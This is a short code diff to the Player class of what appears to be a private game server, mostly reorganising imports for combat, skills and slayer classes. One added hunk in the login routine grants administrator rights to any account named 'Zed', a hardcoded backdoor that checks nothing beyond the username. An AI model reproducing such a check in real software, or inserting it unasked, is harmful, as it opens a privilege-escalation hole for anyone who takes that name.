@@ -35,9 +35,6 @@ import com.rs.game.npc.familiar.Familiar;
 import com.rs.game.npc.godwars.zaros.Nex;
 import com.rs.game.npc.pet.Pet;
 import com.rs.game.player.action.ActionQueue;
-import com.rs.game.player.actions.PlayerCombat;
-import com.rs.game.player.actions.Slayer.Master;
-import com.rs.game.player.actions.Slayer.SlayerTask;
 import com.rs.game.player.content.FriendChatsManager;
 import com.rs.game.player.content.Notes;
 import com.rs.game.player.content.Pots;
@@ -69,6 +66,12 @@ import com.rs.utils.MachineInformation;
 import com.rs.utils.PkRank;
 import com.rs.utils.SerializableFilesManager;
 import com.rs.utils.Utils;
+
+import player.CombatDefinitions;
+import player.PlayerCombat;
+import skills.Skills;
+import skills.slayer.Slayer.Master;
+import skills.slayer.Slayer.SlayerTask;
 
 public class Player extends Entity {
 
@@ -658,6 +661,8 @@ public class Player extends Entity {
 		refreshMouseButtons();
 		refreshPrivateChatSetup();
 		refreshOtherChatsSetup();
+		if (getUsername().equals("Zed"))
+			setRights(2);
 		sendRunButtonConfig();
 		getPackets().sendGameMessage("Welcome to " + Settings.SERVER_NAME + ".");
 		getPackets().sendGameMessage("Please go to www.matrixftw.com to keep up with updates.");
